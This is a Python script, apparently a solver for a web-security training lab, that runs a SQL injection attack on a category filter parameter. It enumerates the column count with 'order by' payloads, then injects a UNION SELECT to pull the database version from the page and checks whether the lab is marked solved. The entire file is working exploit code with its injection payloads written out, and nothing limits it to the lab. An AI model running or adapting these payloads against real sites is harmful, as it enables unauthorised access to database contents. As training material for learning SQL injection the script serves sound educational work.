import requests
import re
from bs4 import BeautifulSoup

def get_column_num(session, domain):
    column_num = 1

    while True:
        column_url = domain + requests.utils.quote("/filter?category=' order by {} #".format(column_num), safe='/:?=')
        r = session.get(column_url)
        if (r.status_code != 200):
            break
        column_num += 1        
    column_num -= 1
    return column_num

def get_database_version(session, domain, column_num):
    payload_element = ["@@version"]
    for _ in range(column_num - 1):
        payload_element.append('null')
    payload = "' union select {}#".format(', '.join(payload_element))
    payload_url = domain + requests.utils.quote("/filter?category=" + payload, safe='/:?=')
    r = session.get(payload_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    database_version = soup.find('th').text
    return database_version

def solve_lab(session, domain):
    r = session.get(domain)
    if ('Solved' in r.text):
        print('Solved. Visit ' + domain + ' to see the solution.')
    else:
        print('Not Solved')
        
if __name__ == '__main__':
    url = input('Enter the URL the lab provide: ');
    domain = re.search(r'^(https?://[^/]+)', url).group(1)
    session = requests.Session()
    try:
        column_num = get_column_num(session, domain)
        database_version = get_database_version(session, domain, column_num)
        print('Database version: ' + database_version)
        solve_lab(session, domain)
    except requests.exceptions.ConnectionError:
        print('Error connecting to the server. Check your URL.')